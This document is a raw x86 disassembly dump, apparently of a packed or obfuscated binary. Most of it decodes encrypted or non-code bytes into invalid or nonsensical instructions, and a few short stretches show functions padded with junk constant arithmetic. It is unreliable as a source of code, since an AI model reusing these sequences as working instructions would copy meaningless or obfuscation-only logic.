  407fd7:	vmwrite esi,DWORD PTR [ebp+0x21]
  407fdb:	mov    ebx,0x34934f5e
  407fe0:	jae    0x407ff6
  407fe2:	jp     0x408025
  407fe4:	loop   0x407fa4
  407fe6:	rcl    DWORD PTR [ebx-0x5017374e],cl
  407fec:	mov    ah,0x8b
  407fee:	adc    ebx,ebp
  407ff0:	mov    esp,0x6b967a6d
  407ff5:	xor    eax,0x3d8ef775
  407ffa:	inc    ebp
  407ffb:	clc    
  407ffc:	and    edi,DWORD PTR [edx-0x1d]
  407fff:	mov    bh,0x6d
  408001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408002:	outs   dx,DWORD PTR ds:[esi]
  408003:	xor    al,0x7b
  408005:	and    esp,esi
  408007:	dec    edi
  408008:	std    
  408009:	xchg   DWORD PTR [edi],ecx
  40800b:	add    bh,BYTE PTR [eax+edx*8]
  40800e:	xchg   edi,eax
  40800f:	into   
  408010:	retf   0x72e4
  408013:	lea    ebx,[edx]
  408015:	adc    eax,DWORD PTR cs:[edi+0x61]
  408019:	shl    DWORD PTR [ebx],0x11
  40801c:	pop    edi
  40801d:	punpckhwd mm7,mm3
  408020:	xor    BYTE PTR [edi+esi*8],0x30
  408024:	fs mov esp,0x34cf068c
  40802a:	mov    dl,0x51
  40802c:	sub    esp,DWORD PTR [ebp-0x47]
  40802f:	mov    ds:0x5cb89b3b,al
  408034:	rcr    dh,0x47
  408037:	cdq    
  408038:	int    0xd7
  40803a:	pop    eax
  40803b:	out    0xcc,al
  40803d:	sahf   
  40803e:	fiadd  WORD PTR [edx]
  408040:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x7fb95f0f]
  408047:	cwde   
  408048:	mov    al,ds:0x7553055b
  40804d:	xchg   esp,eax
  40804e:	hlt    
  40804f:	add    BYTE PTR [esi+0x6a],cl
  408052:	or     ebp,DWORD PTR [edx+0x78]
  408055:	retf   
  408056:	xchg   ecx,eax
  408057:	fwait
  408058:	and    BYTE PTR ds:0x756514aa,0x3e
  40805f:	test   eax,0xf6f7b307
  408064:	(bad)  
  408066:	call   0xdcbd:0x5e57405c
  40806d:	jo     0x408087
  40806f:	cmp    al,0x3e
  408071:	sbb    cl,al
  408073:	cmp    BYTE PTR [ebx+ecx*4],dl
  408076:	mov    ecx,0x30102393
  40807b:	fmul   st,st(0)
  40807d:	mov    al,ds:0x79d23b9a
  408082:	xlat   BYTE PTR ds:[ebx]
  408083:	pop    edx
  408084:	rol    ah,cl
  408086:	sub    BYTE PTR ds:0x307293fd,dl
  40808c:	addr16 jb 0x408017
  40808f:	xlat   BYTE PTR ds:[ebx]
  408090:	ret    
  408091:	test   DWORD PTR [ebp-0xf],edi
  408094:	mov    es,ebx
  408096:	jb     0x408066
  408098:	je     0x40806a
  40809a:	mov    edx,0xb0696255
  40809f:	jo     0x4080e1
  4080a1:	jbe    0x408117
  4080a3:	push   edx
  4080a4:	cmp    BYTE PTR [ebp+0x3a],ah
  4080a7:	pop    esp
  4080a8:	fcom   DWORD PTR [esp+eax*2]
  4080ab:	iret   
  4080ac:	push   ss
  4080ad:	daa    
  4080ae:	pop    ss
  4080af:	ds ror bh,cl
  4080b2:	scas   eax,DWORD PTR es:[edi]
  4080b3:	out    dx,eax
  4080b4:	aad    0x8
  4080b6:	or     cl,BYTE PTR [ebx]
  4080b8:	mov    al,0xec
  4080ba:	inc    edi
  4080bb:	je     0x40812f
  4080bd:	call   FWORD PTR [ebx+0x1c]
  4080c0:	in     al,0x23
  4080c2:	shr    dh,cl
  4080c4:	scas   eax,DWORD PTR es:[edi]
  4080c5:	xor    al,0xb6
  4080c7:	xchg   ebx,eax
  4080c8:	imul   ebx,DWORD PTR [ebx+0x70],0x22e0a588
  4080cf:	xor    eax,0xf7b20775
  4080d4:	xlat   BYTE PTR ds:[ebx]
  4080d5:	jnp    0x40806f
  4080d7:	mov    WORD PTR cs:[edx-0x1595df35],fs
  4080de:	adc    esi,DWORD PTR [ecx+0x3e0fa911]
  4080e4:	push   ebp
  4080e5:	mov    cl,ch
  4080e7:	push   0x78
  4080e9:	pusha  
  4080ea:	mov    dh,0xf8
  4080ec:	ins    DWORD PTR es:[edi],dx
  4080ed:	mov    ah,0x1c
  4080ef:	sbb    bh,dl
  4080f1:	or     DWORD PTR [ebp+ebx*1+0x60],ebp
  4080f5:	jae    0x408098
  4080f7:	mov    DWORD PTR [esi+eiz*1-0x20b06ba5],ebp
  4080fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080ff:	sbb    DWORD PTR [eax],edx
  408101:	and    BYTE PTR [ebp+0x65],dl
  408104:	loopne 0x408158
  408106:	sbb    esi,DWORD PTR [eax-0x4f80eb58]
  40810c:	arpl   WORD PTR [edi-0xeaf6d7b],sp
  408112:	lods   eax,DWORD PTR ds:[esi]
  408113:	push   esp
  408114:	jb     0x40815f
  408116:	xchg   DWORD PTR [ebx+0x4a],ebx
  408119:	int3   
  40811a:	cs enter 0xefb9,0xdf
  40811f:	cli    
  408120:	cli    
  408121:	test   BYTE PTR [esi+0x617ceb],cl
  408127:	pop    edi
  408128:	loopne 0x40813e
  40812a:	leave  
  40812b:	mov    ds:0x7417ad35,al
  408130:	sbb    eax,ebx
  408132:	xor    dh,BYTE PTR [edx]
  408134:	test   edx,esp
  408136:	and    bl,BYTE PTR [eax-0x65]
  408139:	mov    bh,0x35
  40813b:	push   edi
  40813c:	dec    ecx
  40813d:	and    BYTE PTR [edi],ch
  40813f:	mov    WORD PTR ds:0x7439778d,ds
  408145:	dec    edi
  408146:	mov    ah,0xe4
  408148:	lea    edi,[ecx]
  40814a:	scas   al,BYTE PTR es:[edi]
  40814b:	dec    esp
  40814c:	pop    eax
  40814d:	cld    
  40814e:	jmp    0x6677:0x57dd6f41
  408155:	into   
  408156:	in     eax,dx
  408157:	jne    0x40816e
  408159:	stos   BYTE PTR es:[edi],al
  40815a:	or     BYTE PTR [edi-0x6c],ah
  40815d:	mov    eax,0x30011b12
  408162:	xor    BYTE PTR [ebx+0x15],bl
  408165:	into   
  408166:	add    eax,DWORD PTR [edx-0x1535604f]
  40816c:	mov    edi,DWORD PTR [ecx+0x3a]
  40816f:	push   0x47704
  408174:	mov    eax,0x2aad
  408179:	push   0x3a0fb26b
  40817e:	sbb    eax,ecx
  408180:	push   eax
  408181:	push   edx
  408182:	call   0x418100
  408187:	mov    ecx,DWORD PTR [ebp-0x20]
  40818a:	mov    esi,DWORD PTR [ebp-0x1c]
  40818d:	jmp    0x408426
  408192:	hlt    
  408193:	mov    al,0x3c
  408195:	jae    0x408153
  408197:	ja     0x40814e
  408199:	mov    ebp,0x712ffcff
  40819e:	mov    ?,WORD PTR [esi+0x7f]
  4081a1:	cmp    ebp,ecx
  4081a3:	push   esi
  4081a4:	mov    ebx,0xbbbfaabb
  4081a9:	mov    ebx,0x9dc81c9
  4081ae:	adc    dl,bh
  4081b0:	lock popf 
  4081b2:	les    ecx,FWORD PTR [ebx-0x62]
  4081b5:	inc    edi
  4081b6:	iret   
  4081b7:	add    DWORD PTR [edi],edx
  4081b9:	sub    eax,0x8ec5066d
  4081be:	jg     0x408167
  4081c0:	xor    BYTE PTR ds:0x959c3f67,al
  4081c6:	(bad)  
  4081c8:	jae    0x408158
  4081ca:	(bad)  
  4081cc:	jmp    0x2c732735
  4081d1:	pushf  
  4081d2:	out    0x4c,eax
  4081d4:	cmp    ebx,0x7d
  4081d7:	rcr    bh,1
  4081d9:	ds push es
  4081db:	mov    ebp,0x96022dcc
  4081e0:	jne    0x4081be
  4081e2:	xchg   esp,eax
  4081e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e4:	xchg   esi,eax
  4081e5:	cwde   
  4081e6:	push   esp
  4081e7:	daa    
  4081e8:	sbb    esp,esp
  4081ea:	inc    edi
  4081eb:	sub    bh,BYTE PTR [esi+0xe]
  4081ee:	sbb    al,0x36
  4081f0:	and    eax,0x7e6a83fc
  4081f5:	les    esi,FWORD PTR [ecx+0x2b59fc6]
  4081fb:	outs   dx,BYTE PTR ds:[esi]
  4081fc:	mov    bl,0x8c
  4081fe:	lock shr DWORD PTR ds:0x5b3934d0,0x18
  408206:	mov    DWORD PTR [ecx-0x44bcea8a],edi
  40820c:	push   es
  40820d:	pop    DWORD PTR [esi+0x84326bf]
  408213:	pop    esp
  408214:	or     bh,BYTE PTR [eax]
  408216:	sti    
  408217:	push   edi
  408218:	sub    ebx,ebp
  40821a:	push   es
  40821b:	call   0x36889deb
  408220:	inc    ecx
  408221:	sbb    al,0x45
  408223:	enter  0xeda2,0xc4
  408227:	dec    esp
  408228:	xchg   BYTE PTR [edi],dh
  40822a:	cs jge 0x4081df
  40822d:	mov    ebp,0x22b2650
  408232:	push   cs
  408233:	into   
  408234:	add    BYTE PTR [eax+0x2b],bl
  408237:	aaa    
  408238:	loop   0x408246
  40823a:	out    dx,eax
  40823b:	fisttp WORD PTR [ecx+0x5b0ac669]
  408241:	clc    
  408242:	stc    
  408243:	and    eax,DWORD PTR [edi-0x74e0941a]
  408249:	mov    eax,0x9bc4b4fc
  40824e:	pop    ss
  40824f:	push   ebp
  408250:	push   cs
  408251:	add    bl,al
  408253:	mov    cl,0xfc
  408255:	rcl    ecx,cl
  408257:	daa    
  408258:	mov    ah,0x70
  40825a:	add    al,0xd9
  40825c:	retf   
  40825d:	mov    ebx,0x82e5db17
  408262:	shl    BYTE PTR [esp+ebp*1-0x52],0x5b
  408267:	xchg   esp,eax
  408268:	pusha  
  408269:	sbb    eax,0x43b7551b
  40826e:	js     0x40821c
  408270:	lahf   
  408271:	jp     0x4082db
  408273:	popf   
  408274:	and    al,0x82
  408276:	into   
  408277:	mov    cl,0x2a
  408279:	pop    edi
  40827a:	xchg   edx,eax
  40827b:	les    esp,FWORD PTR [ebx-0x3f5121a4]
  408281:	add    eax,0x95449854
  408286:	mov    eax,ds:0xdf4c5c80
  40828b:	inc    esi
  40828c:	jp     0x408284
  40828e:	push   ecx
  40828f:	cld    
  408290:	rcl    DWORD PTR [ecx-0x2f451271],cl
  408296:	xor    ch,0x41
  408299:	dec    esp
  40829a:	std    
  40829b:	int    0x32
  40829d:	push   ebx
  40829e:	jl     0x40829f
  4082a0:	xor    al,0x54
  4082a2:	dec    eax
  4082a3:	aas    
  4082a4:	jp     0x408283
  4082a6:	ds jmp 0x8ca4eb55
  4082ac:	push   es
  4082ad:	into   
  4082ae:	aas    
  4082af:	xor    ebp,DWORD PTR [ebx+ebx*2+0x39248325]
  4082b6:	ja     0x4082d7
  4082b8:	icebp  
  4082b9:	pushf  
  4082ba:	arpl   WORD PTR [esi],ax
  4082bc:	sti    
  4082bd:	push   ds
  4082be:	or     ah,BYTE PTR [edi+0x448ee751]
  4082c4:	cwde   
  4082c5:	ffree  st(7)
  4082c7:	stos   BYTE PTR es:[edi],al
  4082c8:	jae    0x40832b
  4082ca:	pop    ebx
  4082cb:	popf   
  4082cc:	jae    0x40831f
  4082ce:	sub    al,0xf8
  4082d0:	cld    
  4082d1:	jle    0x408260
  4082d3:	pop    es
  4082d4:	sar    DWORD PTR [ebp-0x21],cl
  4082d7:	xor    ch,BYTE PTR [ebp-0x30]
  4082da:	xor    ecx,DWORD PTR [edi+0xa52cb83]
  4082e0:	cli    
  4082e1:	fsubr  st(5),st
  4082e3:	(bad)  
  4082e4:	div    BYTE PTR [ebx-0x47be1d0a]
  4082ea:	add    DWORD PTR [eax],0x9e79f584
  4082f0:	cmp    ah,BYTE PTR [ecx-0x64]
  4082f3:	js     0x4082d3
  4082f5:	sbb    eax,0x6e8e3d0f
  4082fa:	mov    ebp,0xc8e1237a
  4082ff:	in     al,0x19
  408301:	clc    
  408302:	fcomp  DWORD PTR [edi+0x6ac0eb94]
  408308:	push   edx
  408309:	cmc    
  40830a:	daa    
  40830b:	mov    eax,ds:0xa693eee2
  408310:	sbb    BYTE PTR [esp+eax*1],cl
  408313:	rol    BYTE PTR [ebx+edi*8],cl
  408316:	add    eax,0x57cebf16
  40831b:	dec    esp
  40831c:	or     ebp,DWORD PTR [ebx+0x21]
  40831f:	xchg   esp,eax
  408320:	popa   
  408321:	xchg   esi,eax
  408322:	dec    eax
  408323:	dec    eax
  408324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408325:	cs into 
  408327:	add    BYTE PTR fs:[eax],al
  40832a:	ds pop esp
  40832c:	or     al,0x2f
  40832e:	add    eax,0xf0b94e03
  408333:	(bad)  
  408334:	and    al,0x4d
  408336:	pop    eax
  408337:	jae    0x40836e
  408339:	ret    
  40833a:	add    ah,BYTE PTR [edi]
  40833c:	lds    ecx,FWORD PTR ds:0xfef901c9
  408342:	out    0xdd,al
  408344:	bound  esp,QWORD PTR [ebx]
  408346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408348:	pushf  
  408349:	cmp    dl,bl
  40834b:	mov    ch,0x93
  40834d:	mov    edi,DWORD PTR [edx-0x41]
  408350:	adc    edx,DWORD PTR [esi]
  408352:	jecxz  0x408320
  408354:	bswap  ebx
  408356:	popf   
  408357:	js     0x4082e0
  408359:	pop    eax
  40835a:	rcr    DWORD PTR [ebp+0x44908e4a],cl
  408360:	mov    eax,DWORD PTR [ecx+0x49f4479b]
  408366:	sub    al,0xa7
  408368:	pop    esp
  408369:	mov    bh,0x8b
  40836b:	or     dh,BYTE PTR [edx-0x79f22f83]
  408371:	mov    eax,0xfea3082a
  408376:	mov    esi,0xbfb67ec3
  40837b:	and    edx,DWORD PTR [edi-0x5c]
  40837e:	mov    DWORD PTR [edi+ebx*8],ecx
  408381:	mov    edi,DWORD PTR [ecx-0x28]
  408384:	clc    
  408385:	add    eax,0xa2fef215
  40838a:	das    
  40838b:	mov    edx,0x8f302d26
  408390:	mov    ecx,0x4733db56
  408395:	fisubr DWORD PTR [edi+ecx*8-0x39]
  408399:	xor    DWORD PTR [eax],ebp
  40839b:	test   DWORD PTR [eax-0x7bccc94],edi
  4083a1:	add    al,0x15
  4083a3:	les    edx,FWORD PTR [edx-0x2e78295a]
  4083a9:	jg     0x4083e1
  4083ab:	das    
  4083ac:	pop    esi
  4083ad:	mov    bh,0xa7
  4083af:	pushf  
  4083b0:	out    0xa9,al
  4083b2:	push   ds
  4083b3:	ret    0x946a
  4083b6:	sub    eax,0x7f016fbb
  4083bb:	mov    dh,0x39
  4083bd:	mov    WORD PTR [edx],?
  4083bf:	iret   
  4083c0:	dec    edx
  4083c1:	jle    0x4083d3
  4083c3:	inc    ecx
  4083c4:	xchg   ebp,eax
  4083c5:	rcl    DWORD PTR [edi],1
  4083c7:	inc    edx
  4083c8:	xchg   bh,ah
  4083ca:	mov    esi,0xdbae42cb
  4083cf:	lods   eax,DWORD PTR ds:[esi]
  4083d0:	out    dx,al
  4083d1:	iret   
  4083d2:	ret    
  4083d3:	fisubr DWORD PTR [eax]
  4083d5:	cli    
  4083d6:	fbld   TBYTE PTR [ebx+0x41]
  4083d9:	mov    ch,BYTE PTR [eax-0x48]
  4083dc:	lea    ebp,[ebx]
  4083de:	outs   dx,BYTE PTR ds:[esi]
  4083df:	dec    esp
  4083e0:	call   0xf4e:0x1f2a1658
  4083e7:	(bad)  
  4083e8:	sbb    al,0x43
  4083ea:	pop    ebp
  4083eb:	loop   0x408413
  4083ed:	push   ss
  4083ee:	into   
  4083ef:	ins    DWORD PTR es:[edi],dx
  4083f0:	add    BYTE PTR es:[ebx+0x31],ah
  4083f4:	sbb    esp,esi
  4083f6:	or     eax,0x39a68629
  4083fb:	loopne 0x40844a
  4083fd:	xchg   ebp,eax
  4083fe:	(bad)  
  4083ff:	push   DWORD PTR [edi+edx*4+0x18]
  408403:	enter  0x36b,0xfa
  408407:	fwait
  408408:	imul   edi,DWORD PTR [esi+0x37936e2b],0x3a
  40840f:	cs jmp 0x40846b
  408412:	nop
  408413:	pop    ebp
  408414:	cli    
  408415:	mov    BYTE PTR [eax],cl
  408417:	inc    ebp
  408418:	psadbw mm1,QWORD PTR [edx-0x5b]
  40841c:	in     al,0x85
  40841e:	jbe    0x4083bb
  408420:	mov    WORD PTR [ebp-0x3a],?
  408423:	add    DWORD PTR [ebx],0x3a0b681e
  408429:	add    BYTE PTR [eax],al
  40842b:	push   0x3bb2
  408430:	or     esi,edx
  408432:	or     ecx,eax
  408434:	push   esi
  408435:	push   ecx
  408436:	call   0x421ba4
  40843b:	mov    DWORD PTR [ebp-0x10],eax
  40843e:	mov    DWORD PTR [ebp-0xc],edx
  408441:	mov    DWORD PTR [ebp-0x18],0x3163
  408448:	mov    DWORD PTR [ebp-0x14],0x2508
  40844f:	mov    DWORD PTR [ebp-0x20],0x35ad
  408456:	mov    DWORD PTR [ebp-0x1c],0x374
  40845d:	mov    eax,DWORD PTR [ebp-0x20]
  408460:	mov    ecx,DWORD PTR [ebp-0x1c]
  408463:	push   0x1
  408465:	add    eax,0x9671
  40846a:	push   0x792b2806
  40846f:	adc    ecx,0x9781
  408475:	push   ecx
  408476:	push   eax
  408477:	call   0x418100
  40847c:	mov    ecx,DWORD PTR ds:0x422710
  408482:	mov    esi,DWORD PTR ds:0x422714
  408488:	and    eax,ecx
  40848a:	and    edx,esi
  40848c:	mov    esi,DWORD PTR [ebp-0x18]
  40848f:	mov    ecx,DWORD PTR [ebp-0x14]
  408492:	and    esi,eax
  408494:	mov    eax,DWORD PTR [ebp-0x10]
  408497:	and    ecx,edx
  408499:	cmp    DWORD PTR [ebp-0xc],ecx
  40849c:	jb     0x4084d1
  4084a2:	ja     0x4084b0
  4084a8:	cmp    eax,esi
  4084aa:	jb     0x4084d1
  4084b0:	mov    eax,DWORD PTR [ebp-0x28]
  4084b3:	mov    ecx,DWORD PTR [ebp-0x24]
  4084b6:	shrd   eax,ecx,0x2
  4084ba:	shr    ecx,0x2
  4084bd:	mov    ecx,DWORD PTR [ebp-0x28]
  4084c0:	mov    edx,DWORD PTR [ebp-0x24]
  4084c3:	xor    eax,edi
  4084c5:	xor    edx,edx
  4084c7:	shl    ecx,0x1e
  4084ca:	or     eax,edx
  4084cc:	mov    ds:0x4223b0,eax
  4084d1:	pop    edi
  4084d2:	pop    esi
  4084d3:	leave  
  4084d4:	ret    
  4084d5:	push   ebp
  4084d6:	mov    ebp,esp
  4084d8:	sub    esp,0x1c
  4084db:	mov    DWORD PTR [ebp-0x4],0x66a9
  4084e2:	mov    DWORD PTR [ebp-0x1c],0x3a78
  4084e9:	mov    DWORD PTR [ebp-0x18],0x27a1
  4084f0:	mov    DWORD PTR [ebp-0x14],0x2f47
  4084f7:	mov    eax,ds:0x42269c
  4084fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4084ff:	sub    eax,0x14d1
  408504:	xor    eax,0xe7c
  408509:	add    eax,0xffff86b1
  40850e:	add    ecx,eax
  408510:	or     ecx,0x5281
  408516:	push   esi
  408517:	add    ecx,0x7686
  40851d:	push   edi
  40851e:	mov    DWORD PTR [ebp-0x4],0x53ad
  408525:	mov    DWORD PTR [ebp-0x10],0xe3fb
  40852c:	mov    DWORD PTR [ebp-0xc],0x64c9
  408533:	mov    DWORD PTR [ebp-0x8],0x3
  40853a:	mov    eax,DWORD PTR [ebp-0x4]
  40853d:	mov    edx,DWORD PTR ds:0x4226a4
  408543:	mov    edi,DWORD PTR [ebp-0x8]
  408546:	xor    eax,0x1f08
  40854b:	and    eax,0x5fd8
  408550:	or     eax,edx
  408552:	mov    edx,ecx
  408554:	sub    edx,eax
  408556:	mov    eax,DWORD PTR [ebp+0x8]
  408559:	lea    esi,[edx+eax*1+0x1348]
  408560:	xor    edx,edx
  408562:	mov    eax,0x4fc8
  408567:	div    edi
  408569:	mov    edx,DWORD PTR [ebp-0xc]
  40856c:	mov    edi,DWORD PTR [ebp-0x10]
  40856f:	push   0x5
  408571:	imul   eax,edx
  408574:	imul   eax,eax,0x7569
  40857a:	xor    edx,edx
  40857c:	jmp    0x4088b0
  408581:	lock pop esi
  408583:	lds    esi,FWORD PTR [ebp-0x604e4aac]
  408589:	dec    ecx
  40858a:	sub    ch,BYTE PTR [edi+0x7394e63b]
  408590:	add    eax,0xbbbb5ad8
  408595:	in     eax,0xc5
  408597:	mov    ebx,0xac26a3bb
  40859c:	adc    BYTE PTR [ebx-0x635e78d3],bh
  4085a2:	push   ecx
  4085a3:	jne    0x4085b1
  4085a5:	add    al,0x22
  4085a7:	sub    ah,ah
  4085a9:	push   edx
  4085aa:	das    
  4085ab:	imul   ebp
  4085ad:	(bad)  
  4085ae:	pop    ebx
  4085af:	cmp    cl,BYTE PTR [eax-0xe5af0cf]
  4085b5:	out    dx,al
  4085b6:	sbb    edx,ebx
  4085b8:	inc    ecx
  4085b9:	dec    esi
  4085ba:	xor    dh,bh
  4085bc:	scas   eax,DWORD PTR es:[edi]
  4085bd:	outs   dx,BYTE PTR ds:[esi]
  4085be:	push   eax
  4085bf:	mov    ecx,0x704dfc8d
  4085c4:	or     BYTE PTR [edx-0x4],ch
  4085c7:	and    al,0xe8
  4085c9:	sbb    BYTE PTR [edx],bh
  4085cb:	je     0x4085c0
  4085cd:	dec    esi
  4085ce:	call   0x2831:0xa2f2dd52
  4085d5:	dec    esi
  4085d6:	adc    bh,al
  4085d8:	mov    ds:0x898c055c,eax
  4085dd:	mov    esi,0xa78d6d63
  4085e2:	sub    BYTE PTR ds:0x4cdb0184,bh
  4085e8:	adc    DWORD PTR [ecx-0x3],esi
  4085eb:	sbb    BYTE PTR [ebp-0x3f],0x3
  4085ef:	pop    ecx
  4085f0:	mov    ebx,0x35c817e0
  4085f5:	sar    DWORD PTR [ecx],0xf1
  4085f8:	or     DWORD PTR [edi+0x60],eax
  4085fb:	sbb    eax,0x68049879
  408600:	cdq    
  408601:	arpl   WORD PTR [ebx],sp
  408603:	pusha  
  408604:	test   BYTE PTR [eax+0x3883afa2],0xcd
  40860b:	int3   
  40860c:	ins    DWORD PTR es:[edi],dx
  40860d:	pop    ss
  40860e:	rol    BYTE PTR [ebx-0x1f22ebe6],0x79
  408615:	out    dx,al
  408616:	xchg   ebx,eax
  408617:	mov    ds:0x8b1ec3ee,eax
  40861c:	jg     0x4085ec
  40861e:	js     0x4085f8
  408620:	mov    ah,0xc5
  408622:	jmp    0xc220de15
  408627:	loope  0x408631
  408629:	repz mov WORD PTR [edi+ebp*4],fs
  40862d:	not    DWORD PTR [ecx-0x50d47b5e]
  408633:	inc    esi
  408634:	repz lds esi,FWORD PTR ds:0xe8c7b084
  40863b:	ss jbe 0x4086b1
  40863e:	(bad)  
  40863f:	cld    
  408640:	(bad)  
  408641:	enter  0x8d13,0xb8
  408645:	mov    edi,0xb74c34d
  40864a:	push   cs
  40864b:	or     eax,0x7052eec0
  408650:	or     eax,0x60b542ca
  408655:	sub    ecx,DWORD PTR [ecx+0x252248ab]
  40865b:	adc    BYTE PTR [eax+0x7f],ch
  40865e:	xor    DWORD PTR [ebp+0x60],0x27b40353
  408665:	inc    edx
  408666:	jmp    0x91150db5
  40866b:	sahf   
  40866c:	mov    esp,0x5a9aed48
  408671:	aaa    
  408672:	jno    0x40868e
  408674:	scas   eax,DWORD PTR es:[edi]
  408675:	and    eax,0x3b6e95b0
  40867a:	sti    
  40867b:	sbb    al,0x98
  40867d:	sub    BYTE PTR [edx-0x3c],0xe8
  408681:	xchg   al,bh
  408683:	rcl    edx,1
  408685:	popa   
  408686:	scas   eax,DWORD PTR es:[edi]
  408687:	pop    ebp
  408688:	sub    eax,0xdfb8aa71
  40868d:	xchg   edi,eax
  40868e:	call   0xc35d9e86
  408693:	ror    DWORD PTR [ebx+0x23],1
  408696:	jns    0x408692
  408698:	ja     0x408675
  40869a:	in     al,0xe7
  40869c:	retf   0xd850
  40869f:	scas   eax,DWORD PTR es:[edi]
  4086a0:	mov    ds:0x8090ccca,eax
  4086a5:	sar    DWORD PTR [ebp+0x61],1
  4086a8:	add    bl,bh
  4086aa:	jne    0x408653
  4086ac:	shl    DWORD PTR [edx-0x1a],cl
  4086af:	xlat   BYTE PTR ds:[ebx]
  4086b0:	pop    ds
  4086b1:	push   ebp
  4086b2:	jmp    0x719e2c09
  4086b7:	ds sti 
  4086b9:	jp     0x40870d
  4086bb:	mov    edx,0x854811c2
  4086c0:	xchg   dl,bl
  4086c2:	xor    ah,dl
  4086c4:	lea    eax,[ebx+0x30]
  4086c7:	jl     0x4086dc
  4086c9:	daa    
  4086ca:	cli    
  4086cb:	stos   BYTE PTR es:[edi],al
  4086cc:	lods   al,BYTE PTR ds:[esi]
  4086cd:	xor    ah,al
  4086cf:	dec    ebx
  4086d0:	xor    DWORD PTR [edx+0x7dbea718],ebp
  4086d6:	enter  0x167b,0xf8
  4086da:	jle    0x4086c8
  4086dc:	cdq    
  4086dd:	mov    BYTE PTR [edx-0x18e73ee3],dl
  4086e3:	(bad)  [ebp+0xc]
  4086e6:	adc    DWORD PTR [eax+0xc],edx
  4086e9:	std    
  4086ea:	sub    bl,BYTE PTR [edi+0x71]
  4086ed:	push   cs
  4086ee:	lods   eax,DWORD PTR ds:[esi]
  4086ef:	enter  0x5a5a,0xe6
  4086f3:	sub    eax,0x7abb5399
  4086f8:	in     al,0xbb
  4086fa:	test   bh,al
  4086fc:	loope  0x4086fd
  4086fe:	ins    BYTE PTR es:[edi],dx
  4086ff:	cmp    eax,eax
  408701:	enter  0x311e,0xea
  408705:	and    DWORD PTR [ebx-0x1],edi
  408708:	lock mov fs,WORD PTR ds:0x35d19301
  40870f:	xor    BYTE PTR [edi+ebx*1-0x75],al
  408713:	sub    al,0x4
  408715:	add    ecx,ebx
  408717:	add    DWORD PTR [esi+ebx*1-0xf],ebp
  40871b:	inc    ebx
  40871c:	xor    BYTE PTR [edx-0x35],cl
  40871f:	adc    al,0x50
  408721:	enter  0x8827,0xb2
  408725:	or     BYTE PTR [edx],bh
  408727:	xor    DWORD PTR [esi-0x29],0x6b
  40872b:	jnp    0x408711
  40872d:	cwde   
  40872e:	jae    0x4087a0
  408730:	mov    ds:0x2f4dbaa6,eax
  408735:	sbb    BYTE PTR [esi],ch
  408737:	cmp    dl,BYTE PTR [edx+0xd7e4ece]
  40873d:	sub    al,0xae
  40873f:	xor    ch,BYTE PTR [ecx]
  408741:	sti    
  408742:	mov    BYTE PTR [edx+ecx*1],bh
  408745:	sbb    edx,DWORD PTR [edi]
  408747:	shr    BYTE PTR [edi+0x30],0xf5
  40874b:	or     DWORD PTR [ecx+0x54],0xe7323928
  408752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408753:	call   0xfa41:0x32b74bc4
  40875a:	or     BYTE PTR [ebp+0x246e4cf1],cl
  408760:	add    eax,0x581e80ac
  408765:	imul   BYTE PTR [esi+0x2a]
  408768:	cmp    eax,0xa9e086fc
  40876d:	cli    
  40876e:	push   ds
  40876f:	in     al,dx
  408770:	mov    BYTE PTR [esi+0xf],cl
  408773:	sub    ecx,0x57
  408776:	cwde   
  408777:	nop
  408778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408779:	adc    al,0x83
  40877b:	fld    st(1)
  40877d:	fisubr DWORD PTR [edi+0x21]
  408780:	shl    bl,0x79
  408783:	jecxz  0x408779
  408785:	ins    BYTE PTR es:[edi],dx
  408786:	adc    cl,BYTE PTR [esp+edi*1]
  408789:	lock pusha 
  40878b:	and    eax,0xcd088a51
  408790:	adc    dl,BYTE PTR ss:[edx+0x40]
  408794:	imul   eax,esi,0xffffffbb
  408797:	enter  0x1b5e,0xdc
  40879b:	mov    cl,0x6b
  40879d:	gs mov esi,0x5d5e39a8
  4087a3:	adc    BYTE PTR [ecx+0x4a7cf8b0],dl
  4087a9:	cmp    eax,0xb02a2a13
  4087ae:	sahf   
  4087af:	mov    al,0x5c
  4087b1:	cs stos BYTE PTR es:[edi],al
  4087b3:	and    bh,BYTE PTR [ebx+0x4a4b1917]
  4087b9:	sbb    eax,0xb784a11e
  4087be:	xchg   esi,eax
  4087bf:	stos   BYTE PTR es:[edi],al
  4087c0:	lds    eax,FWORD PTR ds:0xb1bb7880
  4087c6:	xchg   BYTE PTR [ebx],bl
  4087c8:	and    eax,0x8f4cc039
  4087cd:	icebp  
  4087ce:	fwait
  4087cf:	cli    
  4087d0:	arpl   WORD PTR [ebx+0x475a9503],sp
  4087d6:	in     al,0xa4
  4087d8:	mov    esp,0x8f479187
  4087dd:	lods   eax,DWORD PTR ds:[esi]
  4087de:	loopne 0x408791
  4087e0:	mov    ds:0x727c2e8f,al
  4087e5:	inc    edx
  4087e6:	push   0x73
  4087e8:	xor    al,0x6e
  4087ea:	xor    eax,ecx
  4087ec:	push   esp
  4087ed:	pusha  
  4087ee:	icebp  
  4087ef:	pop    ss
  4087f0:	inc    ebp
  4087f1:	xchg   edx,eax
  4087f2:	dec    edi
  4087f3:	loopne 0x408792
  4087f5:	in     al,0x28
  4087f7:	or     al,0xb0
  4087f9:	dec    ebp
  4087fa:	fistp  QWORD PTR [edi]
  4087fc:	pop    esi
  4087fd:	fimul  DWORD PTR [esi-0x1b880a6a]
  408803:	sbb    BYTE PTR [esi+eax*4+0x33d10d63],ah
  40880a:	push   eax
  40880b:	(bad)  
  40880c:	pop    ss
  40880d:	aam    0x81
  40880f:	lea    eax,[ebp-0x8]
  408812:	and    eax,0x2f277a65
  408817:	push   esp
  408818:	cld    
  408819:	adc    eax,DWORD PTR [edx]
  40881b:	cmc    
  40881c:	xor    BYTE PTR [ebx],0xf7
  40881f:	aam    0x9f
  408821:	and    eax,DWORD PTR ds:0x68c0b520
  408827:	sbb    DWORD PTR ds:[edi+edi*4+0x11f535ad],edi
  40882f:	jae    0x408858
  408831:	dec    eax
  408832:	cmp    al,BYTE PTR [esi+0x1]
